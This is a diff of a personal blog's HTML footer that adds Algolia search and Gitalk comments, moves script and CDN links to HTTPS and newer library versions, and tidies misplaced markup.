 
+  <div class="site-search">
+  <div class="algolia-popup popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+  </div>
+</div>
+
   <!-- totop start -->
 <div id="totop">
 <a title="返回顶部"><img src="/img/betop.png"/></a>
 </div>
 
 <!-- totop end -->
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk@1/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk@1/dist/gitalk.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.19.0/js/md5.min.js"></script>
 
 
 
@@ -2352,9 +2368,8 @@ $(document).on("click", "ul.archive-list li.archive-list-item", function () {
       repo: "pa55w0rd.github.io",
       owner: "Pa55w0rd",
       admin: "Pa55w0rd",
-      // id: location.pathname,      // Ensure uniqueness and length less than 50
-      id: "Fri Oct 19 2018 11:14:56 GMT+0800",      // Ensure uniqueness and length less than 50
-      distractionFreeMode: false  // Facebook-like distraction free mode
+      id: "Fri Oct 19 2018 11:14:56 GMT+0800",
+      distractionFreeMode: false
     })
     gitalk.render('gitalk-container')
   </script>
@@ -2385,14 +2400,23 @@ $(document).on("click", "ul.archive-list li.archive-list-item", function () {
     "common":{onBeforeClick: SetShareData},
     "share":{"bdCustomStyle":"/css/bdshare.css"}
   };
-  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='https://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
 </script>
 
 
 <!-- 百度分享 end -->
 
-<!-- <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script> -->
-<script src="https://cdn.bootcss.com/jquery/3.0.0-beta1/jquery.min.js"></script>
+
+<script src="/vendors/jquery/jquery-3.1.1.min.js"></script>
+
+
+<script src="/js/scrollReveal.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/instantsearch.js@1.5.1/dist/instantsearch.js"></script>
+
+<script src="/js/algolia-search.js"></script>
+
 
 
 
@@ -2405,7 +2429,7 @@ $(document).on("click", "ul.archive-list li.archive-list-item", function () {
 
 
 
-<! -- mathjax config similar to math.stackexchange -->
+<!-- mathjax config similar to math.stackexchange -->
 
 <script type="text/x-mathjax-config">
 MathJax.Hub.Config({
@@ -2439,44 +2463,28 @@ MathJax.Hub.Queue(function() {
         });
 </script>
 
-<script type="text/javascript" src="http://cdn.bootcss.com/mathjax/2.5.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-</script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@2.7.9/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
 
 
 
 <script src="/js/script.js"></script>
 
 
+<!-- 自定义目录交互功能 -->
+
+<script src="/assets/js/custom-toc.js"></script>
+
+
+<script>
+$(document).ready(function () {
+  if (typeof scrollReveal !== 'undefined') {
+    window.scrollReveal = new scrollReveal({ reset: true });
+  }
+});
+</script>
+
 
 </div>
 </body>
 </html>
 
-
-
-<div class="site-search">
-  <div class="algolia-popup popup">
-    <div class="algolia-search">
-      <div class="algolia-search-input-icon">
-        <i class="fa fa-search"></i>
-      </div>
-      <div class="algolia-search-input" id="algolia-search-input"></div>
-    </div>
-    <div class="algolia-results">
-      <div id="algolia-stats"></div>
-      <div id="algolia-hits"></div>
-      <div id="algolia-pagination" class="algolia-pagination"></div>
-    </div>
-    <span class="popup-btn-close">
-      <i class="fa fa-times-circle"></i>
-    </span>
-  </div>
-</div>
-
-
-<script>
-$(document).ready(function(){
-window.scrollReveal = new scrollReveal({ reset: true});
-//
-})
-</script>
